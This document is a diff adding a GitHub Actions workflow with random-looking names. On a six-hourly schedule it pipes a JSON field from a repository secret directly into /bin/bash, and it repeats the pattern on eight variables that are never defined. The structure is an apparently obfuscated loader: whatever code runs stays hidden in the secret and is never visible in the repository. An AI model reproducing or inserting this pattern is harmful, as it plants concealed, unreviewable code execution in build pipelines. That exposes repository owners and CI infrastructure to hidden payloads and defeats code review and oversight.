@@ -1,0 +1,26 @@
+name: wuhuidash
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhuidash
+        env:
+          pklzg3561: ${{ secrets.pklzg3561 }}
+        run: |
+          echo $pklzg3561 | jq -r .mz96384 | /bin/bash
+          echo $ur63 | jq -r .cnjbh12517 | /bin/bash
+          echo $v74 | jq -r .osra510 | /bin/bash
+          echo $pwgu2120 | jq -r .helr6 | /bin/bash
+          echo $ps51186 | jq -r .hdqg71 | /bin/bash
+          echo $ny4389 | jq -r .wiob8333 | /bin/bash
+          echo $znxrp05133 | jq -r .rawe28406 | /bin/bash
+          echo $vu88282 | jq -r .hjefs83 | /bin/bash
+          echo $qrol1 | jq -r .bxy8 | /bin/bash
+
